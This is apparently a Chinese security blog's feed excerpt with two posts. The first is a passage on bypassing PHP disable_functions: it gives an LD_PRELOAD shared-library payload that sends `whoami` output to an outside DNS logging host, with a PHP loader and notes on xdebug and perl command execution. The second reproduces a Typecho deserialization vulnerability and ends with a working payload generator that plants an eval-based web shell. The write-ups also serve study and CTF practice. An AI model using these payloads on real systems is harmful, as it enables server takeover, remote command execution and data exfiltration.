<h4 id="LD-PRELOAD劫持"><a href="#LD-PRELOAD劫持" class="headerlink" title="LD_PRELOAD劫持"></a>LD_PRELOAD劫持</h4><p>当disable_functions 中没有禁止 putenv函数时，可以考虑上传个so文件进行LD_PRELOAD劫持，方法如下：<br>在本地，vim shell.c</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></div><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line"><span class="comment">#include &lt;string.h&gt; </span></div><div class="line"> </div><div class="line">void payload() &#123;</div><div class="line">        system(<span class="string">"curl `whoami`.9b8534989b407ad73d33.d.zhack.ca"</span>);</div><div class="line">&#125;   </div><div class="line"> </div><div class="line">int  geteuid() &#123;</div><div class="line"><span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="keyword">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</div><div class="line">unsetenv(<span class="string">"LD_PRELOAD"</span>);</div><div class="line">payload();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当这个共享库中的geteuid被调用时，会加载payload()函数，从而实现执行命令。本地把它编译为一个位置信息无关的动态共享库：</p>
<blockquote>
<p>$ gcc -c -fPIC shell.c -o shell<br>$ gcc -shared shell -o shell.so  </p>
</blockquote>
<p>写一个简单的利用文件1.php：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">putenv(<span class="string">"LD_PRELOAD=./shell.so"</span>);</div><div class="line">mail(<span class="string">"root@localhost"</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>将生成的shell.so及1.php上传到目标服务器，浏览器访问1.php，在dnsbin（可换成自己的vps）上可接收到whoami执行后的结果<br><a href="https://www.z4a.net/image/YNQFw" target="_blank" rel="external"><img src="https://www.z4a.net/images/2018/01/31/te.png" alt="te.png"></a></p>
<p>该方法的前提是能够上传文件</p>
<h4 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h4><p>Xdebug 是一个 PHP 的调试工具，支持在本地通过源码远程调试服务器上的 PHP 代码，当xdebug.remote_connect_back选项为1时，可以进行远程调试，从而执行任意php函数,详情利用方式可见rr师傅博客：<a href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface" target="_blank" rel="external">https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface</a></p>
<h3 id="perl命令执行"><a href="#perl命令执行" class="headerlink" title="perl命令执行"></a>perl命令执行</h3><p>perl中的open函数可以执行命令，在ctf的linux命令执行中可能会遇到<br>用法如下：</p>
<blockquote>
<p>创建一个类似格式为’命令|’的文件，再使用 <code>GET &#39;file:命令|&#39;</code>即可执行该命令，需要注意的是GET命令不是linux自带命令，而是存在于libwww-perl中，apt可安装</p>
</blockquote>
<p>之所以使用GET命令可以命令执行，是因为GET函数底层调用了open函数</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;好久没更博客了，就把笔记里的东西整理一下发出来，里面还是有一些少见的trick的~&lt;br&gt;本文持续更新~&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;首先说一个小trick:&lt;br&gt;在渗透过程中，我们常常需要清理痕迹，而在history中会记录命令执行历史，我们可以清除history。也有一个
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>typecho反序列化漏洞复现</title>
    <link href="http://www.tharavel.site/2017/10/29/typecho-deserialization.html"/>
    <id>http://www.tharavel.site/2017/10/29/typecho-deserialization.html</id>
    <published>2017-10-29T14:51:04.482Z</published>
    <updated>2018-09-09T14:34:24.671Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h3><p>Typecho是一个基于php的简单轻巧的开源博客系统，最近看到了这个漏洞，就顺手复现了一下。。。</p>
<h3 id="0X01-漏洞版本"><a href="#0X01-漏洞版本" class="headerlink" title="0X01. 漏洞版本"></a>0X01. 漏洞版本</h3><p>V1.1-15.5.12-beta以前</p>
<h3 id="0X02-漏洞分析"><a href="#0X02-漏洞分析" class="headerlink" title="0X02 漏洞分析"></a>0X02 漏洞分析</h3><p>反序列化可控点：install.php 229~235行<br><img src="http://op5cjcnmi.bkt.clouddn.com/1.PNG" alt="此处输入图片的描述"><br>该博客程序判断是否安装的代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//判断是否已经安装</span></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'finish'</span>]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . <span class="string">'/config.inc.php'</span>) &amp;&amp; <span class="keyword">empty</span>($_SESSION[<span class="string">'typecho'</span>])) &#123;</div><div class="line">    <span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">// 挡掉可能的跨站请求</span></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET) || !<span class="keyword">empty</span>($_POST)) &#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_REFERER'</span>])) &#123;</div><div class="line">        <span class="keyword">exit</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $parts = parse_url($_SERVER[<span class="string">'HTTP_REFERER'</span>]);</div><div class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($parts[<span class="string">'port'</span>])) &#123;</div><div class="line">        $parts[<span class="string">'host'</span>] = <span class="string">"&#123;$parts['host']&#125;:&#123;$parts['port']&#125;"</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($parts[<span class="string">'host'</span>]) || $_SERVER[<span class="string">'HTTP_HOST'</span>] != $parts[<span class="string">'host'</span>]) &#123;</div><div class="line">        <span class="keyword">exit</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里的判断逻辑有点滑稽，参数中含有finish并且Referer是内网即可进入install.php。。。既然能进入install.php,那么现在先决条件已具备，接着分析。</p>
<p>这里有一个反序列化操作，而参数从cookie获取，可控。   想到构造POP链。既然是序列化，免不了利用对象，于是跟进Typecho_Db对象<br><img src="http://op5cjcnmi.bkt.clouddn.com/2.PNG" alt="此处输入图片的描述"><br>看到这里对传入的参数\$adapterName进行了字符串拼接操作，如果$adapterName是一个实例化对象，就会触发__tostring魔法方法，全局搜索发现__tostring方法出现在以下三个类中：</p>
<blockquote>
<p>Typecho_Feed<br>Typecho_Config<br>Typecho_Db_Query</p>
</blockquote>
<p>分别跟进后发现只有Typecho_Feed类可利用，可利用地点如下：<br><img src="http://op5cjcnmi.bkt.clouddn.com/3.PNG" alt="此处输入图片的描述"><br>在290行，如果screenName是不可访问变量，便会调用__get()魔法方法，搜索__get()方法，有好几处，分析后发现在Typecho_Request类中可以利用。在该类中__get方法调用了get方法，而在get方法中又调用了_applyFilter方法<br><img src="http://op5cjcnmi.bkt.clouddn.com/4.PNG" alt="此处输入图片的描述"></p>
<p>跟进该方法<br><img src="http://op5cjcnmi.bkt.clouddn.com/5.PNG" alt="此处输入图片的描述"><br>醒目的array_map函数和call_user_func函数。。。<br>至此POP链已经构造完成。</p>
<h3 id="0X03-Payload"><a href="#0X03-Payload" class="headerlink" title="0X03 Payload"></a>0X03 Payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</div><div class="line">	<span class="keyword">private</span> $_type = <span class="string">'RSS 2.0'</span>;</div><div class="line">	<span class="keyword">private</span> $_items;</div><div class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a)</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;_items[] = <span class="keyword">array</span>(<span class="string">'author'</span>=&gt;$a);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</div><div class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>(<span class="string">'screenName'</span>=&gt;<span class="string">'file_put_contents('</span>shell.php<span class="string">', '</span><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[tharavel]);<span class="meta">?&gt;</span><span class="string">')'</span>);</div><div class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>(<span class="string">'assert'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$payload1 = <span class="keyword">new</span> Typecho_Request();</div><div class="line">$payload2 = <span class="keyword">new</span> Typecho_Feed($payload1);</div><div class="line">$exp = <span class="keyword">array</span>(<span class="string">'adapter'</span> =&gt; $payload2, <span class="string">'prefix'</span> =&gt; <span class="string">'typecho'</span>);</div><div class="line"></div><div class="line"><span class="keyword">echo</span> base64_encode(serialize($exp));</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0X00-前言&quot;&gt;&lt;a href=&quot;#0X00-前言&quot; class=&quot;headerlink&quot; title=&quot;0X00 前言&quot;&gt;&lt;/a&gt;0X00 前言&lt;/h3&gt;&lt;p&gt;Typecho是一个基于php的简单轻巧的开源博客系统，最近看到了这个漏洞，就顺手复现了一下。。。&lt;
    
    </summary>
    
    
  </entry>
  
</feed>
